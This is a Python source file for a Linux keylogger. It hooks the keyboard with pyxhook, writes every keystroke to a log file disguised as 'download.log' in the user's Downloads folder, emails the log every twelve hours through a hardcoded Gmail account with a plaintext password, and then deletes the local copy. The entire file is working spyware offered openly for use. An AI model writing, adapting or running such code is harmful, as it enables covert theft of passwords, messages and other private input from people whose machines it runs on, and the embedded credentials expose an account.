#################################
# Keylogger to be used in Linux #
#################################

import os
import pyxhook
from datetime import datetime
import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler

###############
# Function using yagmail to send the log file
# This email is open to testing purposes for the next 2 weeks
###############
def sendLog(log):
    sender_email = "kloggertest42069@gmail.com" #Insert your email here
    receiver_email = "kloggertest42069@gmail.com" #and here
    subject = "Klogger"
    sender_password = "rotkiv1234" #email password here

    yag = yagmail.SMTP(user=sender_email, password=sender_password)

    contents = [
    "Klogger of the day"
    ]


    yag.send(receiver_email, subject, contents, attachments=log )

############
# Keylogger function
# You can change the directory and/or name of the log "download.log"
# Only emits new line/linebreak when user presses enter or Tab
# If no directory is entered but only file name, it saves where the keylogger is
# Uses file write to insert into log, pyxhook to grab keystrokes
############
def Klogger():

    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('~/Downloads/download.log') #Directory of log file
    )

    user = os.path.expanduser("~")
    timi = datetime.now()

    with open (log, 'a') as f:
        f.write(str(user) + '\n' + str(timi) + '\n')

    def OnKeyPress(event):
        with open(log, 'a') as f:
            if(event.Key == "Return" or event.Key == "Tab"):
                f.write('{}\n'.format(event.Key))
            else:
                f.write('{} - '.format(event.Key))


    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:

        pass
    except Exception as ex:
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

sched = BlockingScheduler()
Klogger()

################
# Function to schedule email
# Can set different intervals for testing purposes
# f.x "seconds = 30" to set the interval to 30 seconds
# After sending the log, deletes the log and we start a new one
################
@sched.scheduled_job('interval', hours=12)
def timed_job():
        homedir = os.path.expanduser("~")
        homedir = homedir + "/Downloads/download.log"

        sendLog(homedir)
        os.remove(homedir)


sched.start()
